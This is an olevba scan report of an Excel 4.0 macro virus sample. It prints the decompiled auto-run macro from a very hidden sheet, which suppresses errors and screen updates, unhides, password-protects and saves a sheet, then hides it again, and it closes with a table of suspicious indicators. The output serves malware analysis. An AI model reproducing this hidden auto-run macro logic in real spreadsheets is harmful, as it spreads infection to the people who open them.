olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Who-1a61ad2f78580bc6d58be3b898cb2e34737d144b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden -  Jaim
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0018     32 LABEL : Cell Value, String Constant - Host len=13 ptgStr "target.xls" 
' 0018     23 LABEL : Cell Value, String Constant - built-in-name 1 Auto_Open len=7 ptgRef3d  Jaim!A2 
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' Sheet,Reference,Formula,Value
'  Jaim,A3,CANCEL.KEY(FALSE),""
'  Jaim,A4,ECHO(FALSE),""
'  Jaim,A5,ERROR(FALSE),""
'  Jaim,A6,"SET.NAME("Host",GET.DOCUMENT(88))",""
'  Jaim,A7,WORKBOOK.UNHIDE("Jaime"),""
'  Jaim,A8,ACTIVATE.PREV(),""
'  Jaim,A9,WORKBOOK.UNHIDE("Jaime"),""
'  Jaim,A10,"IF(ISERROR(WORKBOOK.SELECT("Jaime","Jaime")))",""
'  Jaim,A11,"[",""
'  Jaim,A12,"PROTECT.DOCUMENT(TRUE,,"Jaime1134",TRUE,TRUE)",""
'  Jaim,A13,SAVE(),""
'  Jaim,A14,*STACKERROR* not enough arguments for function: END.IF,""
'  Jaim,A15,"WORKBOOK.HIDE("Jaime",TRUE)",""
'  Jaim,A16,ACTIVATE.NEXT(),""
'  Jaim,A17,"WORKBOOK.HIDE("Jaime",TRUE)",""
'  Jaim,A18,RETURN(),""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+

